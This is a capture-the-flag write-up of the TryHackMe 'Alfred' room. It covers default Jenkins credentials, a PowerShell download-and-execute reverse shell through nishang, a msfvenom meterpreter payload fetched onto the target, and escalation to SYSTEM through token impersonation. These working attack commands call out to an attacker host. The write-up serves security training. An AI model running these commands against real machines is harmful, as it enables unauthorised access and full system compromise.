---
title: "Alfred Writeup THM"
description: "My writeup of the TryHackMe room [Alfred](https://tryhackme.com/room/alfred)"
date: 2023-12-26
image: https://raw.githubusercontent.com/Blueaulo/Alfred-writeup-THM/main/03c7fd6c-be68-4659-9c82-37743811ebdb_Export-f74cfa2b-d9f8-4ed2-b2f2-f5d8cdd8251d/Alfred%20ebebc7814aa2443aac5154421745f1d8/Untitled.png
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Windows
    - Privilege Escalation
    - jenkins
categories:
    - Room
    - Easy
---

## Initial Access

Exploiting Jenkins,

Jenkins is a tool used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it.

First of all I am going to scan the machine, for this I only know that the machine does not respond to ping, and I only need TCP ports,

```bash
nmap -sT -Pn 10.10.207.2

Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-26 10:41 EST
Nmap scan report for 10.10.207.2
Host is up (0.058s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 5.65 seconds
```

This is the output.

- Port 80 is hosting a site, which tells me important informations:

    ![Untitled](https://raw.githubusercontent.com/Blueaulo/Alfred-writeup-THM/main/03c7fd6c-be68-4659-9c82-37743811ebdb_Export-f74cfa2b-d9f8-4ed2-b2f2-f5d8cdd8251d/Alfred%20ebebc7814aa2443aac5154421745f1d8/Untitled.png)


I got a possible username and password: Bruce Wayne

And an email: alfred@wayneenterprises.com

But that’s it for now.

Port 8080 is where Jenkins is hosted.

Upon entering the page, there is a login portal, after trying “Bruce Wayne” and several other password, I am reminded that this is in the description of the room:

“common misconfiguration on a widely used automation server”

So i tried admin:admin, which worked.

Now I got control over Jenkins!

The first thing to do is searching for some type of tool that I can use to get a reverse shell:

https://github.com/samratashok/nishang

First I tried with the script console.

But it didn’t work because it can’t download the script like that, so I found a configure page under the project.

![Untitled](https://raw.githubusercontent.com/Blueaulo/Alfred-writeup-THM/main/03c7fd6c-be68-4659-9c82-37743811ebdb_Export-f74cfa2b-d9f8-4ed2-b2f2-f5d8cdd8251d/Alfred%20ebebc7814aa2443aac5154421745f1d8/Untitled%201.png)

Because it has RDP open we can assume that the machine is running Windows.

I am going to use this script: “https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1”

Which I downloaded in my machine, after that I started a python server: (this will be started in the same directory as the script, that’s because jenkins will download the script thanks to the python server)

```bash
python3 -m http.server 8000
```

Then I start a listener:

```bash
nc -lvnp 4444
```

And then used this script in the script console:

```bash
*powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-python-server-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.18.20.116 -Port 4444*
```

After that I build the config we got a shell!

```bash
nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.18.20.116] from (UNKNOWN) [10.10.207.2] 49236
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>
```

We can see that we are the user alfred\bruce

```bash
PS C:\Program Files (x86)\Jenkins\workspace\project>whoami
alfred\bruce
```

Now I need the user flag, which I found in the user Desktop:

PS C:\Users\bruce\Desktop> ls

```bash
PS C:\Users\bruce\Desktop> ls

Directory: C:\\Users\\bruce\\Desktop

Mode                LastWriteTime     Length Name

a--- 10/25/2019 11:22 PM 32 user.txt
```

Now, I am going to switch this scuffed revshell in an imrpoved version, we can do this using the meterpreter shell.

## Upgrading the shell

Leave your previous connection **OPEN**.

We create our payload:

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.20.116 LPORT=4555 -f exe -o revshellps1.exe`

After creating this payload, download it to the machine using the same method in the previous step:

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.18.20.116:8000/revshellps1.exe','revshellps1.exe')"`

Now that we have done that, we need to use Metasploit:

```bash
**use exploit/multi/handler**
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST Your_Machine_IP
LHOST => 10.18.20.116

msf6 exploit(multi/handler) > set LPORT Your_Port(Same as the one you used for creating the payload)
LPORT => 4555
msf6 exploit(multi/handler) > run
```

Once we run, we nee to go in our previous connection(The one we created with nc) and start the process:

```bash
Start-Process "shell-name.exe”
```

You will find the shell under: `C:\Program Files (x86)\Jenkins\workspace\project`

Now that we have a stable shell, we can try to gain major privileges!

## Privilege Escalation

First thing we do is:

`whoami /priv`

With this we can see all the Enabled privileges

(SeDebugPrivilege, SeImpersonatePrivilege) Those are the one that we find interessing.

Then we check for the available tokens:

`impersonate_token`

And we can see the BUILTIN\Administrators token available

So we try to impersonate the token:

```bash
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user **NT AUTHORITY\SYSTEM**
```

Even though you have a higher privileged token, you may not have the permissions of a privileged user.

To go around that we can migrate to a process with the correct privileges.

First we use `ps` to view the processes, then we grab the PID of services.exe, which we pick because is it normally a ssafe option.

and we migrate to that PID:

```bash
migrate PID-OF-PROCESS
```

Now we should have full SYSTEM privileges!!
